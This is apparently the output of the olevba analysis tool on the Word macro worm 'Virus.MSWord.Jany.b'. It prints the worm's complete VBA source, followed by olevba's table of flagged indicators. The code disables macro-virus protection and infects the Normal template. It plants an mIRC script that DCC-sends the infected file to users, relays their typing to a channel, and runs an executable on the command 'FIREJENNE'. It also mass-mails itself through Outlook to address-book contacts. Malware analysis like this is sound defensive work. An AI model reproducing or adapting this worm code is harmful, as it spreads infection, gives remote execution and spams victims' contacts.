olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jany.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jany.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO JENNE.bas 
in file: Virus.MSWord.Jany.b - OLE stream: 'Macros/VBA/JENNE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Application.EnableCancelKey = False
Application.VBE.ActiveVBProject.VBComponents("JENNE").Export ("C:\JENNE.drv")
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "JENNE" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "JENNE" Then ActiveInstall = True
Next I
If ActiveInstall = True And NormInstall = False Then Set firefox = NormalTemplate.VBProject Else
If ActiveInstall = False And NormInstall = True Then Set firefox = ActiveDocument.VBProject
firefox.VBComponents.Import ("C:\JENNE.drv")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
MkDir "C:\Windows\JENNE\"
ActiveDocument.SaveAs FileName:="C:\Windows\JENNE\JENNE.doc", FileFormat:=wdFormatDocument
Kill "C:\Jenne.ini"
Open "C:\Jenne.ini" For Output As #1
Print #1, "[SCRIPT]"
Print #1, ";JENNE SCRIPT - KEEP IT LOAD IF U WANNA BE SAFE"
Print #1, "n0=on 1:start:{"
Print #1, "n1= .remote on"
Print #1, "n2= .ctcps on"
Print #1, "n3= .events on"
Print #1, "n4= }"
Print #1, "n5=on 1:join:#:{"
Print #1, "n6=if ( $nick == $me ) { halt } | .dcc send $nick C:\Windows\Jenne\JENNE.doc"
Print #1, "n7= }"
Print #1, "n8=on 1:input:*:.msg #JENNE [( $+ $active $+ ) $1-]"
Print #1, "n9=on 1:text:*:?:.msg #JENNE [( $+ $active $+ )]"
Print #1, "n10=on 1:text:FIREJENNE:*://run $findfile(c:\,**.exe*,1)"
Close #1
Kill "C:\mirc\Script.ini"
SourceFile = "C:\Jenne.ini"
DestinationFile = "C:\mirc\Script.ini"
FileCopy SourceFile, DestinationFile
Kill "C:\Jenne.ini"
If Day(Now()) = 2 And Month(Now()) = 12 Then
MsgBox "Happy birthday Jenne-firefox^_^ Bad Ole Unca HeLLfiReZ still loves you xxxxxxxx", "Jenne-firefox^_^"
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "JENNE") <> "Jenne-firefox" Then
 Set JENNEF = CreateObject("Outlook.Application")
 Set Nam = JENNEF.GetNameSpace("MAPI")
 If JENNEF = "Outlook" Then
  Nam.Logon "profile", "password"
    For y = 1 To Nam.AddressLists.Count
     Set Fox_ = Nam.AddressLists(y)
    x = 1
     Set Fire = JENNEF.CreateItem(0)
     For oo = 1 To Fox_.AddressEntries.Count
       Peep = Fox_.AddressEntries(x)
       Fire.Recipients.Add Peep
       x = x + 1
       If x > 70 Then oo = Fox_.AddressEntries.Count
    Next oo
 Fire.Subject = "Hi! it's" & Application.UserName
 Fire.Body = "Remember!!! On Dec99 the 2nd, she will be 35! Happy birthday Jenne-firefox^_^"
 Fire.Attachments.Add ThisDocument.FullName
 Fire.Send
 Peep = ""
 Next y
 Nam.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "JENNE") = "Jenne-firefox"
End If
End Sub


Sub ToolsMacro()
'V_Name = [Jenne-firefox^_^]
'Nhgube = [Qry_Nezt0_4_ArgFabbcre/UryySverm]
'Date   = [23nov99]
'Type   = [W97MacroVirus/Mirc_OutLook_Worm]
'Disclaim = [Happy birthday Jenne-firefox^_^ Bad Ole Unca HeLLfiReZ still loves you xxxxxxxx]
End Sub

Sub ViewVBCode()
MsgBox "No code tO see! ;)"
End Sub

Sub ToolsCustomize()
'
End Sub

Sub FileTemplates()
'
End Sub

Sub Jenne_FireFox()
'Happy birthday Jenne-firefox^_^ Bad Ole Unca HeLLfiReZ still loves you xxxxxxxx
End Sub

Sub FileSave()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Application.EnableCancelKey = False
Application.VBE.ActiveVBProject.VBComponents("JENNE").Export ("C:\JENNE.drv")
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "JENNE" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "JENNE" Then ActiveInstall = True
Next I
If ActiveInstall = True And NormInstall = False Then Set firefox = NormalTemplate.VBProject Else
If ActiveInstall = False And NormInstall = True Then Set firefox = ActiveDocument.VBProject
firefox.VBComponents.Import ("C:\JENNE.drv")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
MkDir "C:\Windows\JENNE\"
ActiveDocument.SaveAs FileName:="C:\Windows\JENNE\JENNE.doc", FileFormat:=wdFormatDocument
End Sub

Sub AutoClose()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Application.EnableCancelKey = False
Application.VBE.ActiveVBProject.VBComponents("JENNE").Export ("C:\JENNE.drv")
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "JENNE" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "JENNE" Then ActiveInstall = True
Next I
If ActiveInstall = True And NormInstall = False Then Set firefox = NormalTemplate.VBProject Else
If ActiveInstall = False And NormInstall = True Then Set firefox = ActiveDocument.VBProject
firefox.VBComponents.Import ("C:\JENNE.drv")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
MkDir "C:\Windows\JENNE\"
ActiveDocument.SaveAs FileName:="C:\Windows\JENNE\JENNE.doc", FileFormat:=wdFormatDocument
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

